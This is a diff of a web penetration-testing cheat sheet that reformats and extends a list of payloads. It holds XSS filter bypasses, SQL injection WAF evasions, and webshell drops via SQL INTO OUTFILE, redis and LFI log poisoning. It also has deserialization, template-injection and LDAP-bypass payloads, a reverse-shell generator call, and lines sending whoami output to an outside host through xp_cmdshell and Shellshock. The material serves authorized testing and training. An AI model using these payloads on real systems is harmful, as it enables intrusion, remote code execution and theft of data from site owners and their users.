@@ -32,7 +32,7 @@ https://github.com/zidansec/CloudPeler
 python cloudflair.py myvulnerable.site
 ```
 
-https://github.com/christophetd/CloudFlair
+https://github.com/christophetd/CloudFlair  
 -> Discover CloudFlare WordPress IP  
 https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/
 
@@ -65,17 +65,27 @@ https://www.silisoftware.com/tools/ipconverter.php
 
 ## PHP Obfuscation Techniques:
 ### Mix - Hex + Octal
-`echo "T\x72\x69\143\153s";#Tricks`
+```
+echo "T\x72\x69\143\153s";#Tricks
+```
 
 ### Variable Parsing
-`$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";#Tricks`
+```
+$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";#Tricks
+```
 
 ### Variable Variables
-`$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;#Tricks`
+```
+$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;#Tricks
+```
 
 ### PHP Non-Alphanumeric 
-`$\_="{"; #XOR char`  
-`echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET`  
+```
+$\_="{"; #XOR char
+```  
+```
+echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET
+```  
 https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
 
 ## PHP Bypass - disable_functions
@@ -187,7 +197,9 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 ```
 
 #### Removing script Tag - Bypass
-`<sCR<script>iPt>alert(1)</SCr</script>IPt>`
+```
+<sCR<script>iPt>alert(1)</SCr</script>IPt>
+```
 
 ### Scaping Quote
 #### Methods
@@ -196,12 +208,16 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 e.g.  
 -> decode URI + unescape method (need eval)  
-`decodeURI(/alert(%22xss%22)/.source)`  
-`decodeURIComponent(/alert(%22xss%22)/.source)`  
+```
+decodeURI(/alert(%22xss%22)/.source)
+decodeURIComponent(/alert(%22xss%22)/.source)
+```  
  
 ### Other bypass techniques
 -> unicode  
-`<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>`  
+```
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
+```
 
 Add execution sink:  
 -> eval  
@@ -209,11 +225,17 @@ Add execution sink:
 -> setTimeout  
 
 -> octal  
-`<img src=x onerror="eval('\141lert(1)')"/>`  
+```
+<img src=x onerror="eval('\141lert(1)')"/>
+```
 -> hexadecimal  
-`<img src=x onerror="setInterval('\x61lert(1)')"/>`  
+```
+<img src=x onerror="setInterval('\x61lert(1)')"/>
+```
 -> mix  (uni, hex, octa)  
-`<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>`  
+```
+<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
+```
 https://checkserp.com/encode/unicode/  
 http://www.unit-conversion.info/texttools/octal/  
 http://www.unit-conversion.info/texttools/hexadecimal/  
@@ -224,7 +246,9 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 <div>here</div>
 ```
 ->  
-`<svg/onload=alert(1)`
+```
+<svg/onload=alert(1)
+```
 
 #### HTML Tag Attributes
 ```
@@ -232,7 +256,9 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 ```
  
 ->  
-`" /><script>alert(1)</script>`
+```
+" /><script>alert(1)</script>
+```
   
 #### Script Tag
 ```
@@ -242,13 +268,19 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 ```
   
 ->  
-`";alert(1);//`
+```
+";alert(1);//
+```
 
 #### Event Attributes
-`<button onclick="here;">Okay!</button>`
+```
+<button onclick="here;">Okay!</button>
+```
 
 ->  
-`alert(1)`
+```
+alert(1)
+```
 
 #### Dom Based
 ```
@@ -256,7 +288,9 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 ```
   
 ->  
-`javascript:alert(1)`
+```
+javascript:alert(1)
+```
 
 ### JavaScript Encoding
 -> jjencode  
@@ -305,13 +339,59 @@ https://github.com/arthaud/git-dumper
 ### Tools
 https://github.com/internetwache/GitTools
 
+## Broken Access Control - IDOR (Insecure Direct Object References)
+1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
+2. Identify access controls in the application  
+3. Change the request method (GET, POST, PUT, DELETE, PATCH…)  
+4. search old versions of API's /api/v1/ /api/v2/ /api/v3/  
+5. Try sending a (*) instead of the ID, especially at search points  
+6. Brute-force IDs depending on context and predictability 
+	
+### IDOR + Parameter Pollution
+#### HTTP Parameter Pollution
+```
+GET /api/v1/messages?id=<Another_User_ID> # unauthourized
+GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
+GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
+```
+	
+#### Json Parameter Pollution
+```
+POST /api/v1/messages
+{"user_id":<You_user_id>,"user_id":<Anoher_User_id>} 
+```
+-> with a JSON Object
+```
+POST /api/v1/messages
+{"user_id":{"user_id":<Anoher_User_id>}} 
+```
+-> with array  
+```
+{"user_id":001} #Unauthorized
+{"user_id":[001]} #Authorized
+```
+#### Random Case
+GET /admin/profile #Unauthorized
+GET /ADMIN/profile #Authorized
+
+### UUIDv1
+https://caon.io/docs/exploitation/other/uuid/
+https://github.com/felipecaon/uuidv1gen
+
+#### Others
+-> add .json if in ruby
+```
+/user/1029 # Unauthorized
+/user/1029.json # Authorized
+```
+	
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
 https://github.com/JohnHammond/ctf-katana#php
 
 ## Insecure Deserialization 
--> Binary  
--> Human-Readable  
+-> Binary (Java, C++, etc ...)  
+-> Human-Readable (XML, JSON, SOAP, YAML, PHP)
 
 ### PHP Deserialization
 #### PHP - Method Serialization:
@@ -371,7 +451,9 @@ Host: <ip>:<port>
 </SOAP:Envelope>
 ```
 
-`ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping <ip>" -o raw`  
+```
+ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping <ip>" -o raw  
+```
 https://github.com/pwntester/ysoserial.net  
 ```
 POST /endpoint HTTP/1.1
@@ -488,21 +570,36 @@ https://pastebin.com/raw/rKpsMp0g
 ### LDAP Injection - Bypass Login
 
 ```$filter = "(&(uid=$username)(userPassword=$password))";```  
-`https://site.com/admin.php?username=*&password=*`  
+
+```
+https://site.com/admin.php?username=*&password=*
+```  
 or  
-`https://site.com/admin.php?username=admin)(userPassword=*))%00&password=blabla`  
+```
+https://site.com/admin.php?username=admin)(userPassword=*))%00&password=blabla
+```  
 
 -> Other
 
-`https://site.com/item?objectClass=*`  
-`(&(sn=administrator)(password=*))`  
-`*))%00`  
+```
+https://site.com/item?objectClass=*
+```  
+```
+(&(sn=administrator)(password=*))
+```  
+```
+*))%00
+```  
 
 ### LDAP Query
-`nmap -p 389,636 --script ldap-* 192.168.191.132`  
+```
+nmap -p 389,636 --script ldap-* <ip>
+```  
 or  
-`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -s base namingcontexts`  
-`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>`  
+```
+ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -s base namingcontexts  
+ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>
+```
 https://github.com/dinigalab/ldapsearch
 
 ### Docs
@@ -516,8 +613,10 @@ https://site.com/index.php?file=oktest&hash=hash
 
 -> Exploitation  
 1-  
-`./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out`  
-https://github.com/iagox86/hash_extender
+```
+./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
+```
+https://github.com/iagox86/hash_extender  
 
 2-  
 burp intruder -> payloads.out in file parameter.  
@@ -553,49 +652,69 @@ php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2
 -> Predefined Paths  
 preg_match('/^\.\/okay\/.+$/', $_GET['file'])  
 
-`./okay/../../../../etc/passwd`  
+```
+./okay/../../../../etc/passwd
+```  
 
 ### PHP Extension Bypass with Null Bytes
-`https://site.com/index.php?file=/etc/passwd%00.php`  
+```
+https://site.com/index.php?file=/etc/passwd%00.php
+```  
 -> Removing .php  
-`https://site.com/index.php?file=index.p.phphp`  
+```
+https://site.com/index.php?file=index.p.phphp
+```  
   
 #### LFI + File Upload
 -> gif  
-`echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif`  
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
+``` 
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
 -> Zip  
 1-  
-`echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
+```
+echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php
+```
 2-  
-`http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id`  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg  
+```
+http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg 
+```
 
 #### Log Poisoning
 -> apache
 ```
 nc ip 80  
-`<?php system($_GET[‘cmd’]); ?>  
+<?php system($_GET[‘cmd’]); ?>  
 ```  
 or  
 1-  
-`curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'`  
+```
+curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
+```
 2-  
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
   
 -> SMTP  
-`telnet ip 23`  
-`MAIL FROM: email@gmail.com`   
-`RCPT TO: <?php system($_GET[‘cmd’]); ?>`  
-`http://ip/index.php?file=/var/mail/mail.log&cmd=id`  
+```
+telnet ip 23
+MAIL FROM: email@gmail.com
+RCPT TO: <?php system($_GET[‘cmd’]); ?>  
+http://ip/index.php?file=/var/mail/mail.log&cmd=id
+```  
   
 -> SSH  
-`ssh \'<?php system($_GET['cmd']);?>'@ip`  
-`http://ip/index.php?file=/var/log/auth.log&cmd=id`  
+```
+ssh \'<?php system($_GET['cmd']);?>'@ip  
+http://ip/index.php?file=/var/log/auth.log&cmd=id
+```  
 
 -> PHP session  
-`http://ip/index.php?file=<?php system($_GET["cmd"]);?>`  
-`http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
+```
+http://ip/index.php?file=<?php system($_GET["cmd"]);?>  
+http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
+```
   
 -> Other Paths  
 ```
@@ -613,9 +732,9 @@ https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-
 -> burp-parameter-names.txt - Wordlist for parameter fuzzing
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
 -> Wordlist LFI - Linux  
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
 -> Wordlist LFI - Windows  
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt  
 -> bypass_lfi.txt  
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
 -> poisoning.txt  
@@ -633,19 +752,29 @@ https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logi
 ## SQL Injection
 ### WAF and Filter Bypass
 #### Query default:
-`'UNION SELECT 1,name,3,4 from users; -- -`
+```
+'UNION SELECT 1,name,3,4 from users; -- -
+```
 
 #### Add comment /* */ for space bypass
-`'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -`
+```
+'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -
+```
 
 #### Add comment /*! */ in query for filters bypass
-`'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -`
+```
+'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -
+```
 
 #### Add random case
-`'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -`
+```
+`'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -
+```
 
 #### Example of mix:
-`'/*!UnIoN/**/SeLeCt/**/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -`
+```
+'/*!UnIoN/**/SeLeCt/**/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -
+```
 
 #### Other Techniques:
 -> urlencode;  
@@ -653,8 +782,10 @@ https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logi
 -> hexadecimal, substr, etc...  
   
 ### Webshell via SQLI
-`LOAD_FILE('/etc/httpd/conf/httpd.conf')`    
-`select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";`
+```
+LOAD_FILE('/etc/httpd/conf/httpd.conf')    
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
+```
  
 ### Reading Files via SQLI - MySQL
 e.g  
@@ -671,6 +802,7 @@ EXEC xp_cmdshell 'powershell -c iwr http://site.com/$(whoami)';--
 ### Scripts Example
 -> Second-Order SQL Injection (query connector)  - Example (edit)
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
+	
 -> Time Based SQL Injection Script - Example (edit)  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
 
@@ -696,7 +828,9 @@ sqlmap --csrf-url=http://site.com/user-profile --csrf-token="<token>" -r request
 
 ### XPATH Notation
 e.g.  
-`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -` 
+```
+%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
+``` 
 
 ### Wordlist for SQL Injection - Bypass  
 https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt
@@ -719,11 +853,13 @@ username=admin&password[$regex]=^a.....
 ```
 
 ## Webshell via redis
-`redis-cli -h ip`  
-`config set dir /var/www/html`  
-`config set dbfilename ok.php`  
-`set test "<?php system($_GET['okay'); ?>"`  
-`save`
+```
+redis-cli -h ip  
+config set dir /var/www/html  
+config set dbfilename ok.php  
+set test "<?php system($_GET['okay'); ?>"  
+save
+```
 
 ## Webshell Infecting views.py - Python (Flask)
 ```
@@ -841,53 +977,59 @@ https://github.com/defparam/smuggler
 -> Study  
 https://portswigger.net/web-security/request-smuggling  
 
-## SSTI
+## Server-Side Template Injection - SSTI
 ### Identify
 
--> Jinja2 or Twig
-  
-`{{3*3}}`
+-> Jinja2 or Twig  
+```
+{{3*3}}
+```
 
--> Smarty or Mako
-  
-`{3*3}`
+-> Smarty or Mako  
+```
+{3*3}
+```
 
--> ERB(Ruby)
-  
-`<%= 7*7 %>`
+-> ERB(Ruby)  
+```
+<%= 7*7 %>
+```
 
--> FreeMarker
-  
-`#{3*3}`
+-> FreeMarker  
+```
+#{3*3}
+```
 
 -> Other  
     
-`${3*3}`
-  
-`${{3*3}}`
-
-`3*3`
+```
+${3*3}
+${{3*3}}
+3*3
+```
 
 ### Java Expression Language
-
 ```
 {{T(java.lang.Runtime).getRuntime().exec('id')}}
 ''.class.forName('java.lang.Runtime').getRuntime().exec('id')
 ```
 
 ### FreeMarker
-
-`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`
+-> Remote Code Execution  
+```
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+```
 
 ### Python - Secret Key
   
-`{{settings.SECRET_KEY}}`
+```
+{{settings.SECRET_KEY}}
+```
   
 ### Doc for SSTI	
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
   
 ## Server Side Request Forgery - SSRF
-
 ### Bypass in Filters
 -> Host obfuscation (hex, octa, integer)  
 e.g.  
@@ -938,17 +1080,19 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### Protocol Smuggling
 
--> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.
+-> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.  
+-> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.  
 
--> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.
-
-gopher://127.0.0.1:port/_
+-> gopher  
+`gopher://127.0.0.1:port/_`
 
 #### Scripts
 -> edit memcached.py  
-`stats items`  
-`stats cachedump <slab class> <number of items to dump>`  
-`get <item>`  
+```
+stats items  
+stats cachedump <slab class> <number of items to dump>  
+get <item>
+``` 
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 
 
 -> zabbix.py  
@@ -1047,9 +1191,13 @@ xhr.send(null);
 
 e.g.  
 -> Redirect via GET  
-`/%0d%0aLocation:attacker`  
+```
+/%0d%0aLocation:attacker
+```  
 -> XSS via GET  
-`/%0d%0a%0d%0a<svg onload="alert(1)">`
+```
+/%0d%0a%0d%0a<svg onload="alert(1)">
+```
 
 ### XSS-Protection Bypass via CRLF
 ```
@@ -1128,7 +1276,9 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ```
   
 ### XInclude to retrieve files with dtd file
-`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
 
 ### Image file upload
 
@@ -1214,33 +1364,66 @@ https://github.com/inonshk/31-days-of-API-Security-Tips
 -> MindAPI  
 https://dsopas.github.io/MindAPI/play/  
 
--> Simple website to guess API Key
+-> Simple website to guess API Key  
 https://api-guesser.netlify.app/
 
 -> HackTricks  
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting
 
--> Others
+-> Fuzzing  
+https://github.com/assetnote/kiterunner
+
+### Rest API/JSON
+The standard documentation is the WADL file:  
+e.g.  
+https://site.com/api/v1/wadl/  
+or  
+representation engines  
+-> swagger-ui  
 https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter
+	
+### SOAP/XML
+The documentation uses WSDL formate and is save in ?wsdl:  
+e.g.  
+https://api.example.com/api/?wsdl  
+https://site.com/ok.asmx?wsdl  
 
-### Rest API
-
-### SOAP
-
+-> API testing tool  
+https://www.soapui.org/downloads/soapui
+	
 ### Graphql
 -> Introspection  
 https://ivangoncharov.github.io/graphql-voyager/  
+	
 -> No-Introspection - Clairvoyance allows us to get GraphQL API schema when introspection is disabled  
 https://github.com/nikitastupin/clairvoyance  
+	
 -> graphw00f - GraphQL Server Fingerprinting  
 ```
 python3 main.py -f -t https://demo.hypergraphql.org:8484/graphql
 ```
 https://github.com/dolevf/graphw00f  
+	
 -> GraphQL Security - Quickly assess the security of your GraphQL apps  
 https://graphql.security/
 
 ## JSON Web Tokens - JWT Attacks
+
+-> Structure  
+https://jwt.io/  
+	
+`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
+	
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (HEADER)
+eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ (PAYLOAD)
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c (Signature)
+	
+### JWT None Attack
+1. Change signature algorithm in the header to none  
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`  
+2. Forge the payload content  
+3. Leave the Signature part of the JWT empty and put a period in the token  
+	
 ### JWT Decoder
 https://jwt.io/  
 -> jwt-decoder.py  
@@ -1266,8 +1449,6 @@ hashcat jwt.txt -m 16500 -a 3 -w 2 ?d?d?d?d
 john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
 ```
 
-### JWT None Attack
-
 ### Other Tools
 -> jwt_tool.py   
 ```
@@ -1275,8 +1456,10 @@ python3 jwt_tool.py <JWT>
 ```
 https://github.com/ticarpi/jwt_tool
 
+#### Docs
+https://rodolfomarianocy.medium.com/jwt-token-entenda-do-ponto-de-vista-defensivo-e-ofensivo-1aad6406de53
+	
 ## Attacking OAuth
- 
 ### Workflow OAuth Authorization Code Grant Type
 1- 
   
@@ -1357,10 +1540,15 @@ Authorization: Bearer <token>
 e.g.  
 -> rememberMe: (Cookie)  
 -> Exploiting  
-`java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class`  
+```
+java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class
+```  
 https://github.com/frohoff/ysoserial  
-`python shiro_exp.py site.com/home.jsp cookie payload.class`  
+```
+python shiro_exp.py site.com/home.jsp cookie payload.class
+```  
 https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py  
+	
 ### Reverse Shell Obfuscator
 e.g.  
 `python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
@@ -1397,7 +1585,9 @@ https://github.com/rodolfomarianocy/hackshell
 "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
 ```
 ### Shellshock
-`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com`
+```
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com
+```
 ### ImageTragik
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/rce/tragik.jpg
 
@@ -1540,7 +1730,6 @@ aws ec2 describe-instances  --profile myprofile
 aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
 aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
 ```
-
 -> EKS  
 ```
 aws eks list-clusters --region us-east-1  
@@ -1559,45 +1748,69 @@ https://github.com/RhinoSecurityLabs/pacu
 ## Recon (+)
 ### Recon in ASN  
 -> asnpepper  
-`python asnpepper.py -o <org> -O output.txt`  
+```
+python asnpepper.py -o <org> -O output.txt
+```  
 -> masscan  
-`masscan -iL cidrs.txt -oG output.txt — rate 10000 -p 80, 443, 8080`  
+```
+masscan -iL cidrs.txt -oG output.txt — rate 10000 -p 80, 443, 8080
+```  
 or  
-`python asnpepper.py -o <org> --test-port 80,443 --threads 2000`  
+```
+python asnpepper.py -o <org> --test-port 80,443 --threads 2000
+```  
 https://bgp.he.net/  
 https://github.com/rodolfomarianocy/asnpepper  
 https://github.com/robertdavidgraham/masscan  
 
 ### One Line Commands
 -> Parameters Discovery  
-`python paramspider.py -d stripe.com | uro | httpx -fc 404 -silent | anew spider_parameters.txt && echo stripe.com | gau | gf xss | uro |  httpx -fc 404 -silent | anew gau_parameters.txt`
+```
+python paramspider.py -d stripe.com | uro | httpx -fc 404 -silent | anew spider_parameters.txt && echo stripe.com | gau | gf xss | uro |  httpx -fc 404 -silent | anew gau_parameters.txt
+```
 
 ### Steps - Web Recon
 #### 1 - Subdomain Discovery
 1.1 -> sublist3r+sort|uniq+httpx+anew  
-`subslit3r -d site.com | sort | uniq | httpx -silent | anew subdomains.txt`
+```
+subslit3r -d site.com | sort | uniq | httpx -silent | anew subdomains.txt
+```
 
 1.2 -> subfinder+sort|uniq+httpx+anew  
-`subfinder -d site.com  | sort | uniq | httpx -silent | anew subdomains.txt`
+```
+subfinder -d site.com  | sort | uniq | httpx -silent | anew subdomains.txt
+```
 
 1.3 -> crt+jq+grep+httpx+anew  
-`curl "https://crt.sh/?q=$1&output=json" | jq -r '.[].name_value' | grep -v "*" | httpx -silent | anew subdomains.txt`
+```
+curl "https://crt.sh/?q=$1&output=json" | jq -r '.[].name_value' | grep -v "*" | httpx -silent | anew subdomains.txt
+```
 
 #### 2 - Parameter Discovery
 2.1 -> gau+gf+uro+httpx+anew  
-`cat subdomains.txt | gau | gf xss | uro | httpx -silent | anew parameters.txt`
+```
+cat subdomains.txt | gau | gf xss | uro | httpx -silent | anew parameters.txt
+```
 
 2.2 -> paramspider + uro + httpx  
-`cat subdomains.txt | xargs -n 1 python paramspider.py -d | httpx -silent | gf xss | uro | anew parameters.txt`  
+```
+cat subdomains.txt | xargs -n 1 python paramspider.py -d | httpx -silent | gf xss | uro | anew parameters.txt
+```  
 
 #### 3 - JS files
 3.1 -> gau+grep+httpx  
-`cat subdomains.txt | grep "\.js" | httpx -fc 404 -silent -o js_files.txt`  
+```
+cat subdomains.txt | grep "\.js" | httpx -fc 404 -silent -o js_files.txt
+```  
 or  
-`cat subdomains.txt | gau | subjs`
+```
+cat subdomains.txt | gau | subjs
+```
 
 #### 4 - Discover endpoints and their parameters in JS files
-`python linkfinder.py -i https://example.com/1.js -o results.html`
+```
+python linkfinder.py -i https://example.com/1.js -o results.html
+```
 
 -> Used Tools  
 https://github.com/projectdiscovery/subfinder  
